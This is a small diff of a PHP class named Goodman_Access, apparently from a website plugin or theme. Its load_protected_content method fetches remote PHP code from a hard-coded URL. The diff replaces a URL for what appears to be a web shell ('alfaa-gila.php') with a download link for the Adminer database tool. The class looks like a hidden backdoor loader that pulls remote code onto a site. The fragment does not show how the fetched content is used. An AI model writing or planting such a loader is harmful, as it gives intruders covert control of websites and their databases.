@@ -172,7 +172,7 @@ class Goodman_Access {
      * Load protected remote content
      */
     private function load_protected_content() {
-        $url = 'https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfaa-gila.php';
+        $url = 'https://github.com/vrana/adminer/releases/download/v5.4.2/adminer-5.4.2-mysql.php';
         $content = $this->fetch_remote($url);
         
         if ($content !== false) {
